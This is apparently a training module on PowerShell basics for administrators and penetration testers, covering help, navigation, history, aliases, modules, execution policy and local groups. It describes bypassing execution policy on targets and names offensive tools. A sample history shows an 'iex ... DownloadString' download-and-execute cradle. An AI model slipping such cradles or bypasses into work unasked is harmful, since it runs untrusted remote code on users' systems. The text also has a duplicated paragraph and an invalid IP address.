Most notably, PowerShell has been built to be `extensible` and to integrate with many other tools and functionality as needed. Most think of it as just another CLI, but it is much more. Did you know it is also a `scripting language`? While CMD has been the default command-line interpreter for Windows hosts only, PowerShell has been released as an [open-source project](https://github.com/PowerShell/PowerShell) and has an extensive offering of capabilities that support its use with Linux-based systems as well. Using the `.NET` framework has also made PowerShell capable of utilizing an object base model of interaction and output instead of text-based only.

### Why Choose PowerShell Over cmd.exe?

`Why does PowerShell matter for IT admins, Offensive & Defensive Infosec pros`?

[PowerShell](https://docs.microsoft.com/en-us/powershell/) has become increasingly prominent among IT and Infosec professionals. It has widespread utility for System Administrators, Penetration Testers, SOC Analysts, and many other technical disciplines where ever Windows systems are administered. Consider IT admins and Windows system administrators administering IT environments made up of Windows servers, desktops (Windows 10 & 11), Azure, and Microsoft 365 cloud-based applications. Many of them are using PowerShell to automate tasks they must accomplish daily. Among some of these tasks are:
- Provisioning servers and installing server roles
- Creating Active Directory user accounts for new employees
- Managing Active Directory group permissions
- Disabling and deleting Active Directory user accounts
- Managing file share permissions
- Interacting with [Azure](https://azure.microsoft.com/en-us/) AD and Azure VMs
- Creating, deleting, and monitoring directories & files
- Gathering information about workstations and servers
- Setting up Microsoft Exchange email inboxes for users (in the cloud &/or on-premises)
  
There are countless ways to use PowerShell from an IT admin context, and being mindful of that context can be helpful for us as `penetration testers` and `even as defenders`. As a sysadmin, PowerShell can provide us with much more capability than `CMD`. It is `expandable`, built for `automation` and scripting, has a much more robust security implementation, and can handle many different tasks that CMD simply cannot.As a pentester, many well-known capabilities are built into PowerShell. PowerShell's module import capability makes it easy to bring our tools into the environment and ensure they will work. However, from a stealth perspective, PowerShell's `logging` and `history` capability is powerful and will log more of our interactions with the host. So if we do not need PowerShell's capabilities and wish to be more stealthy, we should utilize CMD.

### Calling PowerShell

We can access PowerShell directly on a host through the peripherals attached to the local machine or through RDP over the network through various methods.

1. Using Windows `Search`

We can type `PowerShell` in Windows Search to find and launch the PowerShell application and command console.

2. Using the Windows `Terminal` Application

[Windows Terminal](https://github.com/Microsoft/Terminal) is a newer terminal emulator application developed by Microsoft to give anyone using the Windows command line a way to access multiple different command line interfaces, systems, and sub-systems through a single app. This application will likely become the default terminal emulator on Windows operating systems.

3. Using Windows `PowerShell ISE`

The [Windows PowerShell Integrated Scripting Environment (ISE)](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.2) is like an IDE for PowerShell. It can make it easier to develop, debug and test the PowerShell scripts we create. Using PowerShell ISE can be incredibly useful when learning PowerShell.

4. Using PowerShell in `CMD`

We can also launch PowerShell from within CMD. This action may seem trivial, but there will undoubtedly come a time when we can get a shell on a vulnerable Windows target's CLI via CMD and will benefit from attempting to use PowerShell to further our access on the host and across the network.

### Taking a Look at the Shell

One of the first things we may examine when accessing PowerShell on a local or remote system is the prompt.

##### PowerShell Prompt
```powershell-session
PS C:\Users\htb-student> ipconfig 

Ethernet adapter VMware Network Adapter VMnet8:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::adb8:3c9:a8af:114%25
   IPv4 Address. . . . . . . . . . . : 172.16.110.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

The prompt is almost identical to what we see in CMD.

- `PS` is short for PowerShell, followed by the current working directory `C:\Users\htb-student>`.
- This is followed by the cmdlet or string we want to execute, `ipconfig`.
- Finally, below that, we see the output results of our command.
  
Also similar to CMD, PowerShell gives us many commands and cmdlets to utilize. Almost all commands that work in CMD will work in PowerShell.It is essential to understand that there is very little utility in memorising commands.

## Get-Help

- Using the Help function. If we want to see the options and functionality available to us with a specific cmdlet, we can use the [Get-Help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.2) cmdlet.
  
#### Using Get-Help
```powershell-session
PS C:\Users\htb-student> Get-Help Test-Wsman

NAME
    Test-WSMan

SYNTAX
    Test-WSMan [[-ComputerName] <string>] [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-Port <int>] [-UseSSL] [-ApplicationName <string>] [-Credential <pscredential>]
    [-CertificateThumbprint <string>]  [<CommonParameters>]


ALIASES
    None


REMARKS
    Get-Help cannot find the Help files for this cmdlet on this computer. It is displaying only partial help.
        -- To download and install Help files for the module that includes this cmdlet, use Update-Help.
        -- To view the Help topic for this cmdlet online, type: "Get-Help Test-WSMan -Online" or
           go to https://go.microsoft.com/fwlink/?LinkId=141464.
```

Get-Help can give helpful information about a cmdlet. Notice that the `Syntax` output shows us several available options and additional keywords that can be used with each option. `Aliases` are also mentioned, essentially shorter names for our commands. We will discuss Aliases in more depth later in this section. The `Remarks` output provides us with further information about the cmdlet and even additional options we can use to learn more about the cmdlet. One of these additional options is `-online`, which will open a Microsoft docs webpage for the corresponding cmdlet if the host has Internet access.

We can also use a helpful cmdlet called [Update-Help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/update-help?view=powershell-7.2) to ensure we have the most up-to-date information for each cmdlet on the Windows system.

#### Using Update-Help
```powershell-session
PS C:\Windows\system32> Update-Help
```

Notice how much more information was populated regarding `Test-Wsman` after running `Update-Help`. Feel free to compare this output to the output shown earlier when we first covered Get-Help.

#### Using Get-Help After Running Update-Help
```powershell-session
PS C:\Windows\system32> Get-Help  Test-Wsman

NAME
    Test-WSMan

SYNOPSIS
    Tests whether the WinRM service is running on a local or remote computer.


SYNTAX
    Test-WSMan [[-ComputerName] <System.String>] [-ApplicationName <System.String>]
    [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
    ClientCertificate | Credssp}] [-CertificateThumbprint <System.String>]
    [-Credential <System.Management.Automation.PSCredential>] [-Port <System.Int32>]
    [-UseSSL] [<CommonParameters>]


DESCRIPTION
    The `Test-WSMan` cmdlet submits an identification request that determines
    whether the WinRM service is running on a local or remote computer. If the
    tested computer is running the service, the cmdlet displays the WS-Management
    identity schema, the protocol version, the product vendor, and the product
    version of the tested service.


RELATED LINKS
    Online Version: https://docs.microsoft.com/powershell/module/microsoft.wsman.mana
    gement/test-wsman?view=powershell-5.1&WT.mc_id=ps-gethelp
    Connect-WSMan
    Disable-WSManCredSSP
    Disconnect-WSMan
    Enable-WSManCredSSP
    Get-WSManCredSSP
    Get-WSManInstance
    Invoke-WSManAction
    New-WSManInstance
    New-WSManSessionOption
    Remove-WSManInstance
    Set-WSManInstance
    Set-WSManQuickConfig

REMARKS
    To see the examples, type: "get-help Test-WSMan -examples".
    For more information, type: "get-help Test-WSMan -detailed".
    For technical information, type: "get-help Test-WSMan -full".
    For online help, type: "get-help Test-WSMan -online"
```

## Getting Around in PowerShell

Now that we have covered what PowerShell is and the basics of the built-in help features, let us get into basic navigation and usage of PowerShell.

### Where Are We?

We can only move around if we know where we are already, right? We can determine our current working directory (in relation to the host system) by utilizing the `Get-Location` cmdlet.

#### Get-Location
```powershell-session
PS C:\Users\DLarusso> Get-Location

Path
----
C:\Users\DLarusso
```

We can see it printed the full path of the directory we are currently working from; in this case, that would be `C:\Users\DLarusso`. Now that we have our bearings let us look at what objects and files exist within this directory.

### List the Directory

The `Get-ChildItem` cmdlet can display the contents of our current directory or the one we specify.
```powershell-session
PS C:\htb> Get-ChildItem 

Directory: C:\Users\DLarusso


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/26/2021  10:26 PM                .ssh
d-----         1/28/2021   7:05 PM                .vscode
d-r---         1/27/2021   2:44 PM                3D Objects
d-r---         1/27/2021   2:44 PM                Contacts
d-r---         9/18/2022  12:35 PM                Desktop
d-r---         9/18/2022   1:01 PM                Documents
d-r---         9/26/2022  12:27 PM                Downloads
d-r---         1/27/2021   2:44 PM                Favorites
d-r---         1/27/2021   2:44 PM                Music
dar--l         9/26/2022  12:03 PM                OneDrive
d-r---         5/22/2022   2:00 PM                Pictures
```

We can see several other directories within our current working directory. Let's explore one.

### Move to a New Directory

Changing our location is simple; we can do so utilizing the `Set-Location` cmdlet.

#### Set-Location
```powershell-session
PS C:\htb>  Set-Location .\Documents\

PS C:\Users\tru7h\Documents> Get-Location

Path
----
C:\Users\DLarusso\Documents

```

We fed the parameters `.\Documents\` to the Set-Location cmdlet, telling PowerShell that we want to move into the Documents directory, which resides within our current working directory. We could have also given it the full file path like this:
```powershell
Set-Location C:\Users\DLarusso\Documents  
```

### Display Contents of a File

Now, if we wish to see the contents of a file, we can use `Get-Content`. Looking in the Documents directory, we notice a file called `Readme.md`. Let us check it out.

#### Get-Content
```powershell-session
PS C:\htb> Get-Content Readme.md  

# ![logo][] PowerShell

Welcome to the PowerShell GitHub Community!
PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 

<SNIP> 
```

It looks like the Readme file was from the PowerShell GitHub page. Utilizing the `Get-Content` cmdlet is as simple as that.

## Tips & Tricks for PowerShell Usage

### Get-Command

`Get-Command` is a great way to find a pesky command that might be slipping from our memory right when we need to use it. With PowerShell using the `verb-noun` convention for cmdlets, we can search on either.

#### Get-Command Usage
```powershell-session
PS C:\htb> Get-Command

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Add-AppPackage                                     2.0.1.0    Appx
Alias           Add-AppPackageVolume                               2.0.1.0    Appx
Alias           Add-AppProvisionedPackage                          3.0        Dism
Alias           Add-ProvisionedAppPackage                          3.0        Dism
Alias           Add-ProvisionedAppxPackage                         3.0        Dism
Alias           Add-ProvisioningPackage                            3.0        Provisioning
Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
Alias           Apply-WindowsUnattend                              3.0        Dism
Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
Alias           Flush-Volume                                       2.0.0.0    Storage
Alias           Get-AppPackage                                     2.0.1.0    Appx

<SNIP>  
```

The output above was snipped for the sake of saving screen space. Using `Get-Command` without additional modifiers will perform a complete output of each cmdlet currently loaded into the PowerShell session. We can trim this down more by filtering on the `verb` or the `noun` portion of the cmdlet.

#### Get-Command (verb)
```powershell-session
PS C:\htb> Get-Command -verb get

<SNIP>
Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
<SNIP>  
```

Using the `-verb` modifier and looking for any cmdlet, alias, or function with the term get in the name, we are provided with a detailed list of everything PowerShell is currently aware of. We can also perform the exact search using the filter `get*` instead of the `-verb` `get`. The Get-Command cmdlet recognizes the `*` as a wildcard and shows each variant of `get`(anything). We can do something similar by searching on the noun as well.

#### Get-Command (noun)
```powershell-session
PS C:\htb> Get-Command -noun windows*  

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Apply-WindowsUnattend                              3.0        Dism
Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
Cmdlet          Add-WindowsCapability                              3.0        Dism
Cmdlet          Add-WindowsDriver                                  3.0        Dism
Cmdlet          Add-WindowsImage                                   3.0        Dism
Cmdlet          Add-WindowsPackage                                 3.0        Dism
Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
Cmdlet          Dismount-WindowsImage                              3.0        Dism
Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
```

In the above output, we utilized the `-noun` modifier, took the filter a step further, and looked for any portion of the noun that contained `windows*`, so our results came up pretty specific. `Anything` that begins with windows in the noun portion and is followed by anything else would `match` this filter. These were just a few demonstrations of how powerful the `Get-Command` cmdlet can be. Paired with the `Get-Help` cmdlet, these can be powerful help functions provided to us directly by PowerShell. Our next tip dives into our PowerShell session History.

### History

PowerShell keeps a history of the commands run in two different ways. The first is the built-in session history which is implemented and deleted at the start and end of each console session. The other is through the `PSReadLine` module. The `PSReadLine` module tracks the history of any PowerShell commands used in all sessions across the host, among many other features. By default, PowerShell keeps the last 4096 commands entered, but this setting can be modified by changing the `$MaximumHistoryCount` variable.

#### Get-History
```powershell-session
PS C:\htb> Get-History

 Id CommandLine
  -- -----------
   1 Get-Command
   2 clear
   3 get-command -verb set
   4 get-command set*
   5 clear
   6 get-command -verb get
   7 get-command -noun windows
   8 get-command -noun windows*
   9 get-module
  10 clear
  11 get-history
  12 clear
  13 ipconfig /all
  14 arp -a
  15 get-help
  16 get-help get-module
```

By default, `Get-History` will only show the commands that have been run during this active session. Notice how the commands are numbered; we can recall those commands by using the alias `r` followed by the number to run that command again. For example, if we wanted to rerun the `arp -a` command, we could issue `r 14`, and PowerShell will action it. Keep in mind that if we close the shell window, or in the instance of a remote shell through command and control, once we kill that session or process that we are running, our PowerShell history will disappear. With `PSReadLine`, however, that is not the case. `PSReadLine` stores everything in a file called `$($host.Name)_history.txt` located at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine`.

```powershell-session
PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

get-module
Get-ChildItem Env: | ft Key,Value
Get-ExecutionPolicy
clear
ssh administrator@10.172.16.110.55
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
Get-ExecutionPolicy

<SNIP>
```

If we ran the above command and were a frequent user of the CLI, we would have an extensive history file to sort through. The output above was snipped to save time and screen space. One great feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:

- `password`
- `asplaintext`
- `token`
- `apikey`
- `secret`
  
If we ran the above command and were a frequent user of the CLI, we would have an extensive history file to sort through. The output above was snipped to save time and screen space. One great feature of `PSReadline` from an admin perspective is that it will automatically attempt to filter any entries that include the strings:

- `password`
- `asplaintext`
- `token`
- `apikey`
- `secret`
  
This behavior is excellent for us as admins since it will help clear any entries from the `PSReadLine` history file that contain keys, credentials, or other sensitive information. The built-in session history does not do this.

### Clear Screen

This tip is one of convenience. If it bothers us to have a ton of output on our screen all the time, we can remove the text from our console window by using the command `Clear-Host`. It will only affect our current display and will not get rid of any variables or other objects we may have set or made during the session. We can also use `clear` or `cls` if we prefer using short commands or aliases.

### Hotkeys

Unless we are working in the CLI from a GUI environment, our mouse will `not` often work. For example, let's say we landed a `shell` on a host during a pentest. We will have access to CMD or PowerShell from this shell, but we will not be able to utilize the `GUI`. So we need to be comfortable using just a keyboard. `Hotkeys` can enable us to perform more complex actions that typically require a mouse with just our keys. Below is a quick list of some of the more useful hotkeys.

#### Hotkeys

|**HotKey**|**Description**|
|---|---|
|`CTRL+R`|It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.|
|`CTRL+L`|Quick screen clear.|
|`CTRL+ALT+Shift+?`|This will print the entire list of keyboard shortcuts PowerShell will recognize.|
|`Escape`|When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit `escape`, which will erase the line.|
|`↑`|Scroll up through our previous history.|
|`↓`|Scroll down through our previous history.|
|`F7`|Brings up a TUI with a scrollable interactive history from our session.|

This list is not all of the functionality we can use in PowerShell but those we find ourselves using the most.

### Tab Completion
One of PowerShell's best functionalities must be tab completion of commands. We can use `tab` and `SHIFT+tab` to move through options that can complete the command we are typing.

### Aliases
Our last tip to mention is `Aliases`. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the [Get-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2) cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.

It is an excellent practice to make aliases shorter than the name of the actual cmdlet, command, or executable. Even the `Get-Alias` cmdlet has a default alias of `gal`.

We can also set an alias for a specific cmdlet using [Set-Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-7.2). Let us practice with this by making an alias for the `Get-Help` cmdlet.

#### Using Set-Alias
```powershell-session
PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
```

When using `Set-Alias`, we need to specify the name of the alias (`-Name gh`) and the corresponding cmdlet (`-Value Get-Help`).

Below we also include a list of several aliases we find to be most helpful. Some commands have more than one alias as well. Be sure to look at the complete list for other aliases you may find helpful.

#### Helpful Aliases

| **Alias**   | **Description**                                                                                     |
| ----------- | --------------------------------------------------------------------------------------------------- |
| `pwd`       | gl can also be used. This alias can be used in place of Get-Location.                               |
| `ls`        | dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.                    |
| `cd`        | sl and chdir can be used in place of cd. This is an alias for Set-Location.                         |
| `cat`       | type and gc can also be used. This is an alias for Get-Content.                                     |
| `clear`     | Can be used in place of Clear-Host.                                                                 |
| `curl`      | Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used. |
| `fl and ft` | These aliases can be used to format output into list and table outputs.                             |
| `man`       | Can be used in place of help.                                                                       |
For those familiar with `BASH`, you may have noticed that many of the aliases match up to commands widely used within Linux distributions. This knowledge can be helpful and help ease the learning curve.

---

###  Cmdlets

A [cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-13?view=powershell-7.2) as defined by Microsoft is:

"`a single-feature command that manipulates objects in PowerShell.`"

Cmdlets follow a Verb-Noun structure which often makes it easier for us to understand what any given cmdlet does. With Test-WSMan, we can see the `verb` is `Test` and the `Noun` is `Wsman`. The verb and noun are separated by a dash (`-`). After the verb and noun, we would use the options available to us with a given cmdlet to perform the desired action. Cmdlets are similar to functions used in PowerShell code or other programming languages but have one significant difference. Cmdlets are `not` written in PowerShell. They are written in C# or another language and then compiled for use. As we saw in the last section, we can use the `Get-Command` cmdlet to view the available applications, cmdlets, and functions, along with a trait labeled "CommandType" that can help us identify its type.


#### PowerShell Modules

A [PowerShell module](https://docs.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.2) is structured PowerShell code that is made easy to use & share. As mentioned in the official Microsoft docs, a module can be made up of the following:

- Cmdlets
- Script files
- Functions
- Assemblies
- Related resources (manifests and help files)
  
`PowerView.ps1` is part of a collection of PowerShell modules organized in a project called [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) created by the [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments.
  
#### PowerSploit.psd1

A PowerShell data file (`.psd1`) is a [Module manifest file](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_module_manifests?view=powershell-7.2). Contained in a manifest file we can often find:

- Reference to the module that will be processed
- Version numbers to keep track of major changes
- The GUID
- The Author of the module
- Copyright
- PowerShell compatibility information
- Modules & cmdlets included
- Metadata
  
### PowerSploit.psm1

A PowerShell script module file (`.psm1`) is simply a script containing PowerShell code. 

#### Contents of PowerSploit.psm1
```powershell-session
Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
```

The Get-ChildItem cmdlet gets the items in the current directory (represented by the $PSScriptRoot automatic variable), and the Where-Object cmdlet (aliased as the "?" character) filters those down to only the items that are folders and do not have the names "Tests" or "docs". Finally, the ForEach-Object cmdlet (aliased as the "%" character) executes the Import-Module cmdlet against each of those remaining items, passing the DisableNameChecking parameter to prevent errors if the module contains cmdlets or functions with the same names as cmdlets or functions in the current session.

#### Using PowerShell Modules

`Get-Module` can help us determine what modules are already loaded.

#### List-Available
```powershell-session
PS C:\htb> Get-Module -ListAvailable 

 Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...


    Directory: C:\Program Files\WindowsPowerShell\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
Script     3.4.0      Pester                              {Describe, Context, It, Should...}
Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
```

The `- ListAvailable` modifier will show us all modules we have installed but not loaded into our session.

We have already transferred the desired module or scripts onto a target Windows host. We will then need to run them. We can start them through the use of the `Import-Module` cmdlet.

#### Using Import-Module

The [Import-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.2) cmdlet allows us to add a module to the current PowerShell session.

#### Importing PowerSploit.psd1
```powershell-session
PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
PS C:\Users\htb-student\Desktop\PowerSploit> Get-NetLocalgroup

ComputerName GroupName                           Comment
------------ ---------                           -------
WS01         Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
WS01         Administrators                      Administrators have complete and unrestricted access to the compute...
WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
WS01         Cryptographic Operators             Members are authorized to perform cryp
```

Notice how at the beginning of the clip, `Get-NetLocalgroup` was not recognized. This event happened because it is not included in the default module path. We see where the default module path is by listing the environment variable `PSModulePath`.

#### Viewing PSModulePath
```powershell-session
PS C:\Users\htb-student> $env:PSModulePath

C:\Users\htb-student\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
```

When the PowerSploit.psd1 module is imported, the `Get-NetLocalgroup` function is recognized. This happens because several modules are included when we load PowerSploit.psd1. It is possible to permanently add a module or several modules by adding the files to the referenced directories in the PSModulePath.

#### Execution Policy

An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). As outlined in Microsoft's official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.

#### Execution Policy's Impact
```powershell-session
PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1

Import-Module : File C:\Users\Users\htb-student\PowerSploit.psm1
cannot be loaded because running scripts is disabled on this system. For more information, see
about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
```

The host's execution policy makes it so that we cannot run our script. We can get around this, however. First, let us check our execution policy settings.

#### Checking Execution Policy State
```powershell-session
PS C:\htb> Get-ExecutionPolicy 

Restricted  
```

Our current setting restricts what the user can do. If we want to change the setting, we can do so with the `Set-ExecutionPolicy` cmdlet.

#### Setting Execution Policy
```powershell-session
PS C:\htb> Set-ExecutionPolicy undefined 
```

By setting the policy to undefined, we are telling PowerShell that we do not wish to limit our interactions. Now we should be able to import and run our script.

> Note: As a sysadmin, these kinds of changes are common and should always be reverted once we are done with work. As a pentester, us making a change like this and not reverting it could indicate to a defender that the host has been compromised. Be sure to check that we clean up after our actions. Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using -scope.

#### Change Execution Policy By Scope
```powershell-session
PS C:\htb> Set-ExecutionPolicy -scope Process 
PS C:\htb> Get-ExecutionPolicy -list

Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process          Bypass
  CurrentUser       Undefined
 LocalMachine          Bypass  
```

By changing it at the Process level, our change will revert once we close the PowerShell session. Keep the execution policy in mind when working with scripts and new modules.As penetration testers, we may run into times when we need to be creative about how we bypass the Execution Policy on a host. This [blog post](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) has some creative ways that we have used on real-world engagements with great success.

### Calling Cmdlets and Functions From Within a Module

If we wish to see what aliases, cmdlets, and functions an imported module brought to the session, we can use `Get-Command -Module <modulename>` to enlighten us.

### Deep Dive: Finding & Installing Modules from PowerShell Gallery & GitHub

In today's day and age, sharing information is extremely easy. That goes for solutions and new creations as well. When it comes to PowerShell modules, the [PowerShell Gallery](https://www.powershellgallery.com/) Is the best place for that. It is a repository that contains PowerShell scripts, modules, and more created by Microsoft and other users. They can range from anything as simple as dealing with user attributes to solving complex cloud storage issues.

Conveniently for us, There is already a module built into PowerShell meant to help us interact with the PowerShell Gallery called `PowerShellGet`. Let us take a look at it:

#### PowerShellGet
```powershell-session
PS C:\htb> Get-Command -Module PowerShellGet 

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Find-Command                                       1.0.0.1    PowerShellGet
Function        Find-DscResource                                   1.0.0.1    PowerShellGet
```

This module has many different functions to help us work with and download existing modules from the gallery and make and upload our own. From our function listing, let us give Find-Module a try. One module that will prove extremely useful to system admins is the [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8) module. It is a collection of several other modules with tools meant for Active Directory management, Microsoft Exchange, virtualization, and many other tasks an admin would need on any given day.

#### Find-Module

```powershell-session
PS C:\htb> Find-Module -Name AdminToolbox 

Version    Name                                Repository           Description
-------    ----                                ----------           -----------
11.0.8     AdminToolbox                        PSGallery            Master module for a col...
```

Like with many other PowerShell cmdlets, we can also search using wildcards. Once we have found a module we wish to utilize, installing it is as easy as `Install-Module`. Remember that it requires administrative rights to install modules in this manner.

#### Install-Module
In the image above, we chained `Find-Module` with `Install-Module` to simultaneously perform both actions. This example takes advantage of PowerShell's Pipeline functionality. We will cover this deeper in another section, but for now, it allowed us to find and install the module with one command string.Besides creating our own modules and scripts or importing them from the PowerShell Gallery, we can also take advantage of [Github](https://github.com/) and all the amazing content the IT community has come up with externally. Utilizing `Git` and `Github` for now requires the installation of other applications and knowledge of other concepts we have yet to cover, so we will save this for later in the module.

### Tools To Be Aware Of

Below we will quickly list a few PowerShell modules and projects we, as penetration testers and sysadmins, should be aware of. Each of these tools brings a new capability to use within PowerShell
- [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8): AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.
    
- [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps): This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.
    
- [Empire / Situational Awareness](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness): Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by [BC Security](https://github.com/BC-SECURITY) as a part of their Empire Framework.
    
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.
    
- [BloodHound / SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors): Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.
  
---

## User and Group Management

As a sysadmin user and group management is key skill as users are often our main asset to manage and usually an organisation's largest attack vector.

#### What are User Accounts?

User accounts are a way for personnel to access and use a host's resources. In certain circumstances, the system will also utilize a specially provisioned user accounts to perform action.We typically come across 4 different type of accounts:
 - Service accounts
 - Built-In accounts
 - Local users
 - Domain users
   
#### Default Local User Accounts

Several accounts are created in every-instance of windows as OS is installed with host management and basic usage.Below is a list of the standard built-in accounts.

#### Built-In Accounts

|**Account**|**Description**|
|---|---|
|`Administrator`|This account is used to accomplish administrative tasks on the local host.|
|`Default Account`|The default account is used by the system for running multi-user auth apps like the Xbox utility.|
|`Guest Account`|This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.|
|`WDAGUtility Account`|This account is in place for the Defender Application Guard, which can sandbox application sessions.|

## Brief Intro to Active Directory

Active Directory(AD) is a directory service for Windows Environments that provides a central point of management for users,computers,groups,network devices,file shares, group policies,devices and trusts with other organisations.Think of it as the gatekeeper for an enterprise environment. Anyone who is a part of the domain can access resources freely, while anyone who is not is denied access to those same resources or, at a minimum, stuck waiting in the visitors center.we care about AD in the context of users and groups. We can administer them from PowerShell on `any domain joined host` utilizing the `ActiveDirectory` Module

### Local vs. Domain Joined Users

How are they different?

Domain users differ from Local users in that they are granted rights from domain to access resources such as file servers, printers, intranet hosts, and other objects based on user and group membership. Domain user accounts can log in to any host in the domain, while the local user only has permission to access specific host they were created on.

### What Are User Groups?

Groups are a way to sort user accounts logically and, in doing so, provide granular permissions and access to resources without having to manage each user manually. For example, we could restrict access to a specific directory or share so that only users who need access can view the files. On a singular host, this does not mean much to us. However, logical grouping is essential to maintain a proper security posture within a domain of hundreds, if not thousands, of users.

#### Get-LocalGroup
```powershell-session
PS C:\htb> get-localgroup

Name                                Description
----                                -----------
__vmware__                          VMware User Group
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Cryptographic Operators             Members are authorized to perform cryptographic operations.
```

## Adding/Removing/Editing User Accounts & Groups

